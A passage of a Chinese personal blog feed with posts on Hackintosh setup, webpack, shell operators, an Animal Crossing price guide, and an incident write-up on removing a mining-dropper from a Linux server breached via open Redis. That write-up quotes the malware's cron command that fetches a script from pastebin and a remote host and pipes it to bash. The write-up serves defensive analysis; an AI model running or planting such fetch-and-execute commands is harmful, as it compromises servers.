<code>sudo diskutil mount $&#123;diskID&#125;</code> ，${diskID}为你自己的EFI分区标识符，要替换  </li><li>上面命令挂载出了我们本机的EFI文件夹<br><img src="https://static.xiaoblogs.cn/img/20210727174354.png"></li><li>之后，把 <strong>U盘</strong> 的EFI文件夹复制进刚刚 <strong>挂载的EFI盘下</strong><br><img src="https://static.xiaoblogs.cn/img/20210727174551.png">  </li></ol><p>这样以后就不需要插U盘启动了  </p><h2 id="②-安装win11"><a href="#②-安装win11" class="headerlink" title="② 安装win11"></a>② 安装win11</h2><p>前提：  </p><ul><li>强烈建议，win11安装到一个盘，macOS安装到一个盘（日常使用速度慢不了多少）  </li><li>win11 在 2021年7月份还需要DEV的微软账号才可以安装，且必须先安装win10之后在更新中升级到DEV版本</li></ul><p>我的win11安装在sata的固态上，macOS是nvme  </p><ol><li>使用winPE删除要安装的win盘的所有分区  </li><li>使用提前用易升，或者是rufus制作的win安装U盘  </li><li>win安装时选择 win盘就可以了</li><li>win11的升级需要开启主板的TPM(我的是msi微星主板)  </li></ol><p><img src="https://static.xiaoblogs.cn/img/win11tpm.png"></p><hr><p>上面的情况是两块盘安装系统，win不会覆盖我们opencore的EFI  </p><h3 id="如果是一块硬盘，请根据下面的链接完成"><a href="#如果是一块硬盘，请根据下面的链接完成" class="headerlink" title="如果是一块硬盘，请根据下面的链接完成"></a>如果是一块硬盘，请根据下面的链接完成</h3><p><a href="https://dortania.github.io/OpenCore-Multiboot/empty/samedisk.html#precautions">一块硬盘安装双系统</a><br>PS.简单描述：使用macOS的恢复模式中的磁盘工具，划分出来一个区给win来安装  </p><h2 id="③-升级系统"><a href="#③-升级系统" class="headerlink" title="③ 升级系统"></a>③ 升级系统</h2><p>每一次小的系统升级，还是打的系统升级。都有可能导致原有的补丁，驱动等失效，升级需要谨慎。建议先去贴吧、论坛等看一看别人升级是否有问题  </p><p>基本步骤：  </p><ul><li>更新opencore，替换EFI文件夹下的opencore核心文件  </li><li>更新驱动，去驱动仓库查看</li><li>macOS的 <code>系统偏好设置</code> 中更新</li></ul><h2 id="④-引导盘选择界面美化"><a href="#④-引导盘选择界面美化" class="headerlink" title="④ 引导盘选择界面美化"></a>④ 引导盘选择界面美化</h2><p>成品如下：<br><img src="https://static.xiaoblogs.cn/img/%E5%90%AF%E5%8A%A8%E9%80%89%E9%A1%B9%E5%AE%8C%E6%88%90%E5%9B%BE.png">  </p><p>准备的资源：  </p><ul><li><a href="https://github.com/acidanthera/OcBinaryData">Binary Resources</a> 启动界面的图片资源，音频资源等  </li><li><a href="https://github.com/acidanthera/OpenCorePkg/releases">OpenCanopy.efi</a> 放到 <code>Drivers</code> 文件夹下  </li></ul><ol><li>将下载好的Binary Resources解压后的 <code>Resources</code> 文件夹放到引导盘的 <code>EFI/OC</code> 文件夹下<br><img src="https://static.xiaoblogs.cn/img/20210727181448.png"></li><li>使用PropreTree工具修改config.plist  </li></ol><ul><li>Misc属性 -&gt; Boot -&gt; PickerMode: External<br><img src="https://static.xiaoblogs.cn/img/20210727181742.png"></li><li>Misc属性 -&gt; Boot -&gt; PickerAttributes: 17<br><img src="https://static.xiaoblogs.cn/img/20210727181832.png"></li><li>Misc -&gt; Boot -&gt; PickerVariant: Acidanthera\GoldenGate(<a href="https://dortania.github.io/OpenCore-Post-Install/cosmetic/gui.html#setting-up-opencore-s-gui">官网有三种主题</a>)  </li></ul><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这是第二次写OC的教程了，上次教程的配置是i7 6700 + H170m + rx480。这次发现，A+A的配置更简单。如果你的配置和我一样，可以用我的EFI  </p><ul><li><a href="https://github.com/MIMONATCH/ryzen3600-rx480-B450m-opencoreEFI">我的EFI</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这一篇文章我是为了自己做一份装黑果教程的备份，同时发布到Hexo上去。也是给看到这一篇博客的人有一点的帮助吧  &lt;/p&gt;
&lt;div id=&quot;vBanner_Root&quot;&gt;
    &lt;div id=&quot;vBanner_Container&quot; style=&quot;background-image: linear-gradient(to bottom right, white ,#B3C6EC)&quot;&gt;
        &lt;a href=&quot;&quot;&gt;
            &lt;div id=&quot;vBanner_post&quot; title=&quot;A-SOUL&quot; style=&quot;background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/ZZD7q421.png)&quot;&gt;&lt;/div&gt;
        &lt;/a&gt;
        &lt;div id=&quot;vLogo_Container&quot;&gt;
            
                
                   &lt;div id=&quot;vBanner_logo&quot; style=&quot;background-image:url(https://midou-static-1257227807.cos.ap-chengdu.myqcloud.com/img/A-SOUL.png)&quot;&gt;&lt;/div&gt;     
                    
            
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;首先请先关注下上面图片的五个货（B站搜索：A-Soul 名字在图片上有） &lt;/p&gt;</summary>
    
    
    
    <category term="学习呦" scheme="https://mimonarchrd.gitee.io/categories/%E5%AD%A6%E4%B9%A0%E5%91%A6/"/>
    
    
    <category term="黑苹果" scheme="https://mimonarchrd.gitee.io/tags/%E9%BB%91%E8%8B%B9%E6%9E%9C/"/>
    
    <category term="opencore" scheme="https://mimonarchrd.gitee.io/tags/opencore/"/>
    
  </entry>
  
  <entry>
    <title>webpack速览知识</title>
    <link href="https://mimonarchrd.gitee.io/2021/07/08/webpack%E9%80%9F%E8%A7%88%E7%9F%A5%E8%AF%86/"/>
    <id>https://mimonarchrd.gitee.io/2021/07/08/webpack%E9%80%9F%E8%A7%88%E7%9F%A5%E8%AF%86/</id>
    <published>2021-07-08T15:24:00.000Z</published>
    <updated>2022-04-30T03:15:12.922Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-webpack是什么"><a href="#1-webpack是什么" class="headerlink" title="1. webpack是什么"></a>1. webpack是什么</h2><p> 按照官方的定义：webpack是一种静态资源的打包器。比如说有两个模块都通过CJS或者是ESM引入了一些js库，通过webpack就可以将引入的这些js库打包到bundle中去。再比如，要通过require的方式引入一个非js的文件，也可以通过webpack来转换为可以让其直接引用的模块</p><span id="more"></span><p><img src="https://static.xiaoblogs.cn/img/20210708121523.png"></p><h2 id="2-webpack中的入口input、出口output、loader、plugin各个都是些什么"><a href="#2-webpack中的入口input、出口output、loader、plugin各个都是些什么" class="headerlink" title="2. webpack中的入口input、出口output、loader、plugin各个都是些什么"></a>2. webpack中的入口input、出口output、loader、plugin各个都是些什么</h2><ul><li>  入口input：webpack构建模块依赖图的起点，webpack会从这里开始打包模块需要的静态资源文件</li><li>  出口output：webpack打包后的bundle的输出位置和名字</li><li>  loader：能让webpack处理各种各样的文件的工具或者说是模块，比如React的JSX，就需要一个react-loader来进行处理</li><li>  plugin：拓展webpack的一些插件，常用的会紧接着补充</li></ul><h2 id="3-webpack中的loader"><a href="#3-webpack中的loader" class="headerlink" title="3. webpack中的loader"></a>3. webpack中的loader</h2><p> loader可以让webpack打包各种各样的文件，img，ttf，css，jsx等等。在使用这些资源的时候可以直接的import到相应的模块中去。在官方文档中将一个文件引入另一个文件这种关系称之为依赖关系。webpack可以自动的生成一张各种文件之间依赖关系的图（依赖图）</p><hr><p>首先，我创建了一个项目</p><p><img src="https://static.xiaoblogs.cn/img/20210709040442.png"></p><p>只要关心<code>app</code>文件夹和<code>public</code>文件夹以及<code>webpack.config.js</code>文件</p><p>app文件夹中的entry.js代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> greet <span class="keyword">from</span> <span class="string">&#x27;./greet&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Image</span> <span class="keyword">from</span> <span class="string">&#x27;../res/tetris.png&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">ImageDom</span> = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line"><span class="title class_">ImageDom</span>.<span class="property">src</span> = <span class="title class_">Image</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;container&quot;</span>).<span class="title function_">appendChild</span>(<span class="title function_">greet</span>());</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;container&quot;</span>).<span class="title function_">appendChild</span>(<span class="title class_">ImageDom</span>);</span><br></pre></td></tr></table></figure><p>我的目标是直接通过import引入一张图片，图片在res文件夹下。现在就需要fs-loader来完成这个任务了</p><p>在webpack.config.js中要这样配置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>=&#123;</span><br><span class="line">    <span class="attr">entry</span>:__dirname+<span class="string">&quot;/app/entry.js&quot;</span>,   <span class="comment">//入口文件</span></span><br><span class="line">    <span class="attr">output</span>:&#123;                           </span><br><span class="line">        <span class="attr">path</span>:__dirname+<span class="string">&quot;/public&quot;</span>,      <span class="comment">//输出文件的存放位置</span></span><br><span class="line">        <span class="attr">filename</span>:<span class="string">&quot;bundle.js&quot;</span>           <span class="comment">//输出文件的名称</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">module</span>:&#123;</span><br><span class="line">        <span class="attr">rules</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">test</span>: <span class="regexp">/\.(pngsvgjpggif)$/</span>,</span><br><span class="line">            <span class="attr">use</span>: [</span><br><span class="line">                <span class="string">&#x27;file-loader&#x27;</span></span><br><span class="line">                ]</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>module是要使用的webpack模块，rules是对应的*-loader匹配的规则，里面test（条件）可以填写正则表达式，字符串等。use为loader的入口，表示你要用什么loader来处理</p><p>这样就很容易的完成了webpack的配置及简单的使用</p><p>简单的了解解决不了实际情况下的复杂问题，你要问我要不要来点复杂问题的例子，我只能说我的复杂问题不是你的，你的不是我的，要不断实践去解决自己的问题</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1-webpack是什么&quot;&gt;&lt;a href=&quot;#1-webpack是什么&quot; class=&quot;headerlink&quot; title=&quot;1. webpack是什么&quot;&gt;&lt;/a&gt;1. webpack是什么&lt;/h2&gt;&lt;p&gt; 按照官方的定义：webpack是一种静态资源的打包器。比如说有两个模块都通过CJS或者是ESM引入了一些js库，通过webpack就可以将引入的这些js库打包到bundle中去。再比如，要通过require的方式引入一个非js的文件，也可以通过webpack来转换为可以让其直接引用的模块&lt;/p&gt;</summary>
    
    
    
    <category term="webpack" scheme="https://mimonarchrd.gitee.io/categories/webpack/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux中的||和&amp;&amp;</title>
    <link href="https://mimonarchrd.gitee.io/2020/06/25/Linux%E4%B8%AD%E7%9A%84%E6%88%96%E5%92%8C%E4%B8%8E/"/>
    <id>https://mimonarchrd.gitee.io/2020/06/25/Linux%E4%B8%AD%E7%9A%84%E6%88%96%E5%92%8C%E4%B8%8E/</id>
    <published>2020-06-24T17:10:27.000Z</published>
    <updated>2021-09-04T13:05:24.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="如果在shell中执行这样的命令输出是什么呢？"><a href="#如果在shell中执行这样的命令输出是什么呢？" class="headerlink" title="如果在shell中执行这样的命令输出是什么呢？"></a>如果在shell中执行这样的命令输出是什么呢？</h2><p>假设下面命令中的两个文件都存在</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ali_server:~<span class="comment"># cat file1||cat file2   </span></span><br></pre></td></tr></table></figure><p>答案：鼠标移动到下方的黑条处或点击下方黑条即可查看答案</p><style>  .heimu{ background-color: #252525; color: #252525; text-shadow: none; } .heimu:hover{ transition: color .13s linear; color: #fff; }</style><div class="heimu">会输出file1的内容</div> <br /><p>为什么会这样呢？“||”的意思不是或者吗，没错，但是<strong>在Linux中是先执行||前面的命令也就是例子中的cat file1如果执行失败会执行后面的cat file2</strong>，并且都要先执行第一个命令，无论成功或者失败</p><p>cat a成功后就执行第一个cat a<br>a1不存在，但是也会执行这个命令，之后执行后面的cat a</p><p>同样还是file1和file2，如果执行下面的命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ali_server:~<span class="comment"># cat file1&amp;&amp;cat file2</span></span><br></pre></td></tr></table></figure><p>答案：鼠标移动到下方的黑条处或点击下方黑条即可查看答案</p><div class="heimu">会输出file1和file2的内容</div> <br /> <p>“&amp;&amp;”代表并且，也就是“都”的意思，所以就是既cat file1又cat file2</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;如果在shell中执行这样的命令输出是什么呢？&quot;&gt;&lt;a href=&quot;#如果在shell中执行这样的命令输出是什么呢？&quot; class=&quot;headerlink&quot; title=&quot;如果在shell中执行这样的命令输出是什么呢？&quot;&gt;&lt;/a&gt;如果在shell中执行这样的命令输</summary>
      
    
    
    
    <category term="学习呦" scheme="https://mimonarchrd.gitee.io/categories/%E5%AD%A6%E4%B9%A0%E5%91%A6/"/>
    
    
    <category term="Linux" scheme="https://mimonarchrd.gitee.io/tags/Linux/"/>
    
    <category term="Linux中的命令" scheme="https://mimonarchrd.gitee.io/tags/Linux%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>记一次老友的Linux服务器被恶意程序入侵并解决的过程</title>
    <link href="https://mimonarchrd.gitee.io/2020/06/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%80%81%E5%8F%8B%E7%9A%84Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%85%A5%E4%BE%B5%E5%B9%B6%E8%A7%A3%E5%86%B3%E7%9A%84%E8%BF%87%E7%A8%8B/"/>
    <id>https://mimonarchrd.gitee.io/2020/06/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%80%81%E5%8F%8B%E7%9A%84Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%85%A5%E4%BE%B5%E5%B9%B6%E8%A7%A3%E5%86%B3%E7%9A%84%E8%BF%87%E7%A8%8B/</id>
    <published>2020-06-14T05:52:46.000Z</published>
    <updated>2021-08-19T02:14:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>首先放一个老友的连接：<a href="http://yuyy.info/">http://yuyy.info</a></p><p>恶意程序名称：javaUpdate</p><p>最近的日子正是毕业的日子，也是最忙的日子。老友给我发了条信息</p><p>我去，怎么就中招了呢</p><p>通过ssh登录老友的服务器，<strong>发现登录的时候要卡很久，通过强制中断ctrl+c才能看见用户提示符</strong></p><p>用top命令查看下现阶段运行进程情况，top命令简单说就是监控Linux中运行的进程的在系统中情况</p><span id="more"></span><p>好家伙</p><p>通常的这些恶意进程是无法直接通过kill杀死的，有保护进程或者说有定时任务会重启什么的。</p><p>既然看见了这个进程，就进入/proc/$proc_num(进程号)/中cat里面的exe文件，这个文件夹是内存中运行的进程的地方，找到这个图中的“1056”号文件夹，cat这个exe，这个文件直接指向可执行程序。</p><p>这里没有截图，不过执行cat后的结果是提示这个可执行文件已经删除了</p><p>所以这个恶意程序，通过了服务器中的某一个开放的端口扫描到了靶机，之后通过扫描漏洞进行渗透，这一次的入侵老友说是通过redis的开放端口，老友为了方便，直接开放了6789端口，并且将本仅能本地访问的redis的IP改成了4个0。</p><p>为了不让你抓到这个程序，他在执行完后就自我删除了。你通过ps -ef命令是找不到脚本的位置的</p><p>执行的内容会放一个脚本，也会简单说明执行了什么命令在服务器上，也会说明如何得到的这个脚本。</p><p>好吧，现在就一步步来解决问题吧</p><p>首先进行的一些常规的操作</p><p>最基本的操作，改root用户密码，停止redis服务。我是将我好友上面的apache，mysql，nginx等服务都停止了。防止恶意程序会再扫描服务器漏洞进行入侵。</p><p>下一步操作，进入阿里云的实例控制台中的防火墙，或者安全策略</p><p>禁用一些不需要的端口</p><p>切记不要图方便开启xxxx-xxxx号端口的危险行为</p><p>之后，我前面已经提到了，关闭一些服务</p><p>找到这个脚本</p><p>既然上文已经提到是先下载，再执行，后删除。那么怎么定位这个脚本呢？因为如果你通过kill来处理掉这个进程，过一会儿就又会启动。这说明要么就是守护进程，要么就是在定时任务中。通常如果是一个守护进程，恶意程序是不会让你使用类似top或者ps命令查看到此类进程。</p><p>进程隐藏的方式的恶意程序要比这次对付的程序强大的多，这个先不提及</p><p>因为直接cat定时任务crontab很快速就先看了</p><p>来看看服务器中可怜的定时任务</p><p>并且，在bin目录下，也生成了两个可执行的sh</p><p>可以见到还上锁了</p><p>内容如下：</p><p>可见会从不同的url下载恶意程序</p><p>这里说明下，如果要解锁一个文件，要用下面的命令</p><pre><code>chattr -i xxx</code></pre><p>同时有一个定时文件是定时执行这两个文件</p><p><strong>这里要注意一点，因为有些恶意程序会劫持命令，比如rm命令会给你换名字，或者不会让你执行</strong></p><p>如果有这种情况，可以使用busybox，busybox相当于一个集成命令的工具，里面有一些常用的命令，使用busybox的时候只要加上这个工具名字的前缀就可</p><pre><code>busybox rm xxx</code></pre><p>cat出定时任务，可以看到下面的内容</p><p>有点小</p><pre><code>sed -i &#39;/aziplcr72qjhzvin/d&#39; /etc/hosts; (python -c &#39;import urllib2 as fbi;print fbi.urlopen(&quot;https://pastebin.com/raw/1eDKHr4r&quot;).read()&#39;||curl -fsSLk sadan666.xyz:9080/rr||wget -q -O - sadan666.xyz:9080/rr --no-check-certificate -t 2 -T 60)|bash</code></pre><p>第一部分：</p><pre><code>sed -i &#39;/aziplcr72qjhzvin/d&#39; /etc/hosts;</code></pre><p>。。</p><p>往hosts文件中写东西，是加密的。主要就是将0.0.0.0解析到一个网址</p><p>第二部分：</p><pre><code>python -c &#39;import urllib2 as fbi;print fbi.urlopen(&quot;https://pastebin.com/raw/1eDKHr4r&quot;).read()&#39;</code></pre><p>使用urllib2库来执行一条python语句，打开后面那个网址</p><p>第三部分：</p><pre><code>curl -fsSLk sadan666.xyz:9080/rr||wget -q -O - sadan666.xyz:9080/rr --no-check-certificate -t 2 -T 60)|bash</code></pre><p>都是从后面那个url中curl和wget一段经过base64加密的脚本之后执行，注意里面的选项都是启用了静默模式的，不会有任何输出，所以我们无法通过日志等文件查看这两条命令的执行记录</p><p>所以，有了这个，找到脚本不难，但不是说在服务器上找，而是我们直接请求他的url获得脚本</p><pre><code>(curl -fsSL https://pastebin.com/raw/UhUmR517||wget -q -O - https://pastebin.com/raw/UhUmR517)|sed &#39;s/\r//&#39;</code></pre><p>这里的url和上面的不同，这里的url是从其他定时任务文件中得到的，上面有截图显示这个url，但是他们指向的都是一个恶意脚本</p><p>将得到的bash64结果放到在线的解码器中</p><p>这就找到这个脚本了</p><p>这里我将脚本放到这里供大家参考</p><p>PS.wp不支持sh文件上传，就上传txt了，我已经将里面的一些部分更改，以防意外</p><p><a href="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/wakuang.zip">wakuang</a><a href="https://www.xiaoblogs.cn/wp-content/uploads/2020/06/wakuang.zip">下载</a></p><p>通过这个文件的分析，能得到所有的cron定时任务文件都被写入了上面的命令，会在每时每刻都会执行上面的命令，获取到这个可执行的脚本，之后执行这个脚本删除它，脚本中再往定时任务，root的.bashrc文件中写入上述的命令。如果我们只是单纯的kill到那个恶意进程，定时任务会立刻执行重新下载脚本并执行，如果我们将定时任务中的任务删除，当我们每次通过ssh登录服务器时，会执行.bashrc文件，又开始了死循环</p><p><strong>删除它</strong></p><p>好的，我们已经简单的分析下，那么我们改怎么处理呢？难道说通过拼手速的方式？</p><p>很简单的方法，如果恶意程序要用到curl和wget命令来下载恶意程序，那就。。</p><p><strong>第一步</strong>：删除wget命令和curl命令，或者将bin目录下面的两者移出去，这样先阻断了通过网络再次下载进程</p><p><strong>第二步</strong>：删除所有的定时任务前，把crond定时任务的服务关了，并且，直接删了定时任务执行的命令。这样，写在定时任务中的命令就失效了</p><p><strong>第三步</strong>：kill掉恶意程序进程，现在kill掉。定时任务失效，wget和curl都用不了，无法从网上下载恶意程序</p><p><strong>第四步</strong>：清理定时任务文件，并且要清理.bashrc下面写入的下载恶意脚本命令，要不然下次连接服务器就又会执行下载命令</p><p><strong>第五步</strong>：查看有没有可疑进程等</p><p>我这边直接top了下，服务器恢复了正常</p><p><strong>总结</strong></p><p>基本来说，这是一次正式挖矿前的清理服务器其他挖矿程序和注入自己恶意程序的操作。并不是正真的挖矿程序</p><p>恶意程序其中的一部分</p><p>上图可以见到这个恶意脚本会kill一些其他的挖矿脚本，之后就是上述提到的步骤。我通过分析这个脚本并没有找到挖矿程序。通过top分析也没有进程占用异常的资源的情况，所以，我仅觉得是挖矿前的“清理”，同行的恶意竞争？？笑~</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;首先放一个老友的连接：&lt;a href=&quot;http://yuyy.info/&quot;&gt;http://yuyy.info&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;恶意程序名称：javaUpdate&lt;/p&gt;
&lt;p&gt;最近的日子正是毕业的日子，也是最忙的日子。老友给我发了条信息&lt;/p&gt;
&lt;p&gt;我去，怎么就中招了呢&lt;/p&gt;
&lt;p&gt;通过ssh登录老友的服务器，&lt;strong&gt;发现登录的时候要卡很久，通过强制中断ctrl+c才能看见用户提示符&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;用top命令查看下现阶段运行进程情况，top命令简单说就是监控Linux中运行的进程的在系统中情况&lt;/p&gt;</summary>
    
    
    
    <category term="学习呦" scheme="https://mimonarchrd.gitee.io/categories/%E5%AD%A6%E4%B9%A0%E5%91%A6/"/>
    
    
    <category term="恶意入侵Linux服务器" scheme="https://mimonarchrd.gitee.io/tags/%E6%81%B6%E6%84%8F%E5%85%A5%E4%BE%B5Linux%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
    <category term="挖矿" scheme="https://mimonarchrd.gitee.io/tags/%E6%8C%96%E7%9F%BF/"/>
    
    <category term="运维安全" scheme="https://mimonarchrd.gitee.io/tags/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>大头菜价格完全攻略</title>
    <link href="https://mimonarchrd.gitee.io/2020/05/09/%E5%A4%A7%E5%A4%B4%E8%8F%9C%E4%BB%B7%E6%A0%BC%E5%AE%8C%E5%85%A8%E6%94%BB%E7%95%A5/"/>
    <id>https://mimonarchrd.gitee.io/2020/05/09/%E5%A4%A7%E5%A4%B4%E8%8F%9C%E4%BB%B7%E6%A0%BC%E5%AE%8C%E5%85%A8%E6%94%BB%E7%95%A5/</id>
    <published>2020-05-09T05:54:57.000Z</published>
    <updated>2021-08-19T02:15:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xw.qq.com/cmsid/20200403A0S9X500">原文链接</a></p><p><img src="https://inews.gtimg.com/newsapp_bt/0/11536401468/641"></p><p>先上个曹卖图  </p><p>首先以下说明全部都是NS动森(Animal Crossing: New Horizon)解包出来的数据，与版上有人PO的3DS数据只有少许出入，如果你已经看过3DS版也不想多花时间的话，可以直接跳过这篇说明了。再来要感谢Ninji将这次控制大头菜价格的code解包出来(推特链接)有兴趣的可以进去看大头菜价格是怎么写的。直接用以下链接计算预测大头菜价格即可(由Reddit网友/u/mikebryantuk制作)大头菜价格预测工具以下正文是根据网友Edricus写的Breaking Down the Stalk Market翻译并根据解包code修正内文的错误之处最后是这篇是写给像我这种边缘人看的，有朋友的话直接到有好价钱的朋友岛上卖出即可。  </p><span id="more"></span><p><strong>一、基础价格</strong>：为玩家在周日所购入的大头菜价格，在模型预测中占有重要地位。大头菜的购入价格必在(90,110)的区间中乱数决定，即大头菜价格一定是90-110铃钱。举例：周日跟曹卖买大头菜1颗100铃钱，从明天(周一)起至周六的基础价格皆为100铃钱。不会因为你跑去别人岛上买较便宜的大头菜而改变，直到下周日曹卖再次出现才会改变。</p><p><strong>二、售价模型：</strong></p><p>1.模型种类本次大头菜价格波动共有4种模型，分别为0 – 波型(Random)1 – 三期型(Large Spike)</p><p>2 – 递减型(Decreasing)</p><p>3 – 四期型(Small Spike)每周玩家皆会被系统指派一种售价模型，直到下次曹卖出现才会再次更动模型，为期7天。并且玩家本周的售价模型会影响下周的售价模型机率，具体如下  </p><p><img src="https://inews.gtimg.com/newsapp_bt/0/11536401469/641"></p><p>举例：如果玩家本周价格模型为三期型，下周将有50％机会变为波型、5％机会变三期型、20％机会变为波型、25％机会变为四期型。2. 期(Phases)每周我们可以把每次价格变动时间区分开来，一天2期一周共可分为14期。每期的长度为12小时。每天的12AM与12PM会进入下一期并更新卖价。因为商店是从8AM开到10PM，所以一天实际上能卖的期间只能分为上半期(8AM-12PM)4小时，与下半期(12PM-10PM)10小时。有趣的是周日的两期虽然无法卖菜，但在代码中是有给予售价的，都是卖0铃钱，实际上能卖菜的只有12期。</p><p><strong>三、各模型细节</strong>以下模型解释中，各种举例为方便计算我们假设基础价格为100铃钱。1.波型波型中我们可以把价格变动区分成2大阶段，分别为下跌阶段上涨阶段每周皆固定会有2次的下跌阶段与3次的上涨阶段<strong>各阶段的持续时间表</strong>(以下为方便理解我们将1期称为1个半天)  </p><p><img src="https://inews.gtimg.com/newsapp_bt/0/11536401470/641"></p><p>各阶段发生的时序固定为上涨阶段1 – 下跌阶段1 – 上涨阶段2 – 下跌阶段2 – 上涨阶段3<strong>各阶段的价钱算法表</strong>(以下所有与铃钱有关计算皆为计算后无条件进位至下个整数)  </p><p><img src="https://inews.gtimg.com/newsapp_bt/0/11536401471/641"></p><p><strong>此模型重点</strong>最好价格为买价的1.4倍，最差价格为买价的0.9倍以基础价格100铃钱来说，就是140与90铃钱<strong>TIPS</strong>如果发现是波型请赶快在价格好时售出虽然机率很低，但最坏情况有可能都不会超过买价。2. 三期型最刺激好赚的模型，要发大财就要靠这个各阶段的持续时间表  </p><p><img src="https://inews.gtimg.com/newsapp_bt/0/11536401472/641"></p><p>各阶段发生的时序固定为下跌阶段 – 暴涨阶段 – 暴跌阶段 – 乱数下跌阶段各阶段的价钱算法表  </p><p><img src="https://inews.gtimg.com/newsapp_bt/0/11536402498/641"></p><p><strong>此模型重点</strong>此模型可以算出收购大头菜的最高价为110*600％ ＝ 660铃钱<strong>TIPS</strong>此模型开始与递减型一模一样，也与第四期很相似如果发现开始涨价，并且开始涨价的第2个半天涨超过140％请务必在下个半天卖掉。3.递减型最浅显易懂的模型，一定不会赚钱。各阶段的持续时间表  </p><p><img src="https://inews.gtimg.com/newsapp_bt/0/11536402499/641"></p><p>各阶段的价钱算法表  </p><p><img src="https://inews.gtimg.com/newsapp_bt/0/11536402500/641"></p><p><strong>此模型重点</strong>没有重点，块陶<strong>TIPS</strong>此模型开始与三期型一模一样，第8个半天(礼拜四下午)还没涨的话请赶快想办法卖掉。3.四期型虽然不像三期型那么爽，但也不失为一个赚钱的好机会。各阶段的持续时间表  </p><p><img src="https://inews.gtimg.com/newsapp_bt/0/11536402501/641"></p><p>各阶段发生的时序固定为下跌阶段1 – 上涨阶段 – 下跌阶段2各阶段的价钱算法表  </p><p><img src="https://inews.gtimg.com/newsapp_bt/0/11536402502/641"></p><p><strong>此模型重点</strong>相当平均的模型，容易在早期发现，也可以卖到上限2倍买价的钱，不错。<strong>TIPS</strong>只要第1个半天(周一上午)跌超过15％就一定是四期型，虽然机率低但也有万一一开始就近入上涨阶段，会与波型十分相似，分别重点是第3个半天(周二上午)，如果有涨超过1.4倍则必为四期型，请务必等到上涨阶段的第4个半天将大头菜卖掉。<strong>四、结论</strong>从以上讨论可以得知大头菜的买价必为90-110铃钱且可以预测并在最好的时机将菜卖出，也可以得知大头菜最好与最坏的收购价。最好：三期型，基础价格110，股神有机会卖到一颗660铃钱。最差：四期型，基础价格90，有可能惨到一颗9铃钱，但四期型一定会涨回来，无须担忧。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://xw.qq.com/cmsid/20200403A0S9X500&quot;&gt;原文链接&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://inews.gtimg.com/newsapp_bt/0/11536401468/641&quot;&gt;&lt;/p&gt;
&lt;p&gt;先上个曹卖图  &lt;/p&gt;
&lt;p&gt;首先以下说明全部都是NS动森(Animal Crossing: New Horizon)解包出来的数据，与版上有人PO的3DS数据只有少许出入，如果你已经看过3DS版也不想多花时间的话，可以直接跳过这篇说明了。再来要感谢Ninji将这次控制大头菜价格的code解包出来(推特链接)有兴趣的可以进去看大头菜价格是怎么写的。直接用以下链接计算预测大头菜价格即可(由Reddit网友/u/mikebryantuk制作)大头菜价格预测工具以下正文是根据网友Edricus写的Breaking Down the Stalk Market翻译并根据解包code修正内文的错误之处最后是这篇是写给像我这种边缘人看的，有朋友的话直接到有好价钱的朋友岛上卖出即可。  &lt;/p&gt;</summary>
    
    
    
    <category term="游戏哎" scheme="https://mimonarchrd.gitee.io/categories/%E6%B8%B8%E6%88%8F%E5%93%8E/"/>
    
    
